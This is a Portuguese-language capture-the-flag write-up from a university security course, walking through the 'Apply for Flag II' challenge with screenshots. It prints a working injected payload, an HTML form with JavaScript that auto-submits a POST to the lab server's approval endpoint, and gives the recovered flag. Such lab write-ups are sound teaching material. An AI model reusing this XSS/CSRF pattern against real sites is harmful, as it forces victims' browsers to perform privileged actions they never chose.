# CTF-Apply_for_FlagII.md
Abrimos o link no qual somos deparados com uma página a pedir para nós implorar-mos pela flag, como não somos simps escrevemos o seguinte:
|Site|
|:---:|
|![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/f161df37-08ef-4703-b2a0-151c982a9f7c)|
|Depois fomos direcionados para outra página:|
|![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/ebfa5209-2ab8-4608-9176-e6dd1e02cf10)|
|Clicamos em `page`, porque era o unico sitio que dava para clicar:|
|![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/76d62e94-3634-41bc-ba3f-c84cf47048ff)|
|Mais uma vez só dava para clicar em `here`, mas isto trolou-nos porque voltou para o mesmo sítio do ínicio|
|![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/9278f176-1ed7-43e2-a8d6-a66a50cf355d)|
|Tentamos encontrar outro sitio para clicar, e agora conseguimos reparar que no home tinha sido simpático e dava-nos o id próximo request|
|![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/137e8ef9-2800-4144-8208-5eaa446ca754)|

Agora visto que temos o id do próximo request, vamos tentar uma abordagem diferente, então para isto criamos um scrip para meter em input na caixinha de texto:
```javascript
<form method="POST" action="http://ctf-sp.dcc.fc.up.pt:5005/request/88345598596205a8156274d61d39dfa199ef384b/approve" role="form">          
    <div class="submit">                  
        <input type="submit" id="giveflag" value="Give the flag">   
    </div>  
</form>    

<script type="text/javascript"> 
    document.querySelector('#giveflag').click();  
</script>
```
Nesta linha `<form method="POST" action="http://ctf-sp.dcc.fc.up.pt:5005/request/88345598596205a8156274d61d39dfa199ef384b/approve" role="form">` foi onde colocamos o id, mais um approve para ver se nos leva além do que já fomos.
|Novo input|
|:---:|
|![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/e4a68c3c-1d1f-42e6-a8c7-7bc58b22ca05)|
|O que não fomos bem recebidos|
|![image](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/102924343/6d00194b-bcae-4b14-9903-1c3397908af0)|
|Tentamos dar a volta a isto e reduzir no script ao meter só `<form method="POST" action="http://ctf-sp.dcc.fc.up.pt:5005/request/99b2c53267fc8d02252c62bc604ca0b76ac2112c/approve" role="form">`, clicamos no page/here|

Com isto foi nos dada a página com o flag:
```
flag{926f5532be02019b7fc7a4c78f120439}
```
